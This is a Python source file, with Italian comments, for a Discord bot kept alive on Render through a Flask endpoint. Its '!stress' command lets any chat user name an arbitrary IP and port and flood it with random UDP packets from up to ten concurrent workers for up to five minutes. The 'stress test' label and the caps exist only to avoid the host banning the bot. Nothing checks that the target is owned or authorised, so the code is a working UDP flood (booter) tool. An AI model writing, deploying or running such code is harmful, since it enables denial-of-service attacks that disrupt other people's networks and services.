import discord
from discord.ext import commands
import socket
import os
import asyncio
from flask import Flask
from threading import Thread

# --- CONFIGURAZIONE FLASK ---
app = Flask('')
@app.route('/')
def home(): return "Bot is live!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()

# --- LOGICA BOT ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

active_tests = {}

async def packet_sender(ip, port, end_time, test_id):
    """Singolo 'operaio' che invia pacchetti."""
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_packet = os.urandom(1024) # 1KB di dati
    
    while asyncio.get_event_loop().time() < end_time:
        if not active_tests.get(test_id, True):
            break
        try:
            client.sendto(bytes_packet, (ip, port))
            # Un micro-attesa per non far crashare il bot stesso
            await asyncio.sleep(0.0001) 
        except:
            break

@bot.command()
async def stress(ctx, ip: str, port: int, duration: int = 60, threads: int = 1):
    """Uso: !stress [IP] [PORTA] [DURATA] [THREADS]"""
    
    # Limiti di sicurezza per Render
    if duration > 300: duration = 300
    if threads > 10: # Massimo 10 worker per non farsi bannare da Render
        await ctx.send("⚠️ Massimo 10 threads consentiti sul piano gratuito.")
        threads = 10

    test_id = f"{ip}:{port}"
    active_tests[test_id] = True
    
    await ctx.send(f"🚀 **Stress Test Multi-Thread**\n📍 IP: `{ip}:{port}`\n👥 Threads: `{threads}`\n⏱️ Durata: `{duration}s`")

    end_time = asyncio.get_event_loop().time() + duration
    
    # Creiamo più task (operai) che lavorano contemporaneamente
    tasks = []
    for _ in range(threads):
        tasks.append(asyncio.create_task(packet_sender(ip, port, end_time, test_id)))

    # Attendiamo che tutti i task finiscano
    await asyncio.gather(*tasks)
    
    active_tests.pop(test_id, None)
    await ctx.send(f"✅ Test su {ip} completato con {threads} threads.")

# --- AVVIO ---
if __name__ == "__main__":
    keep_alive()
    token = os.environ.get("DISCORD_TOKEN")
    if token:
        bot.run(token)
